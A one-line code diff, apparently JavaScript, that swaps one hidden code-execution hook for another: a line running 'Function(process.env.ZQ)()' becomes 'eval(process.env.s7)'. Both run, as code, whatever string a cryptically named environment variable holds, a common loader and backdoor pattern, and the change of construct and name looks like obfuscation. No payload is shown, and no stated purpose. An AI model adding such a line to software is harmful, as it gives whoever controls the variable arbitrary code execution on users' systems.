@@ -1,1 +1,1 @@
-Function(process.env.ZQ)()
+eval(process.env.s7)
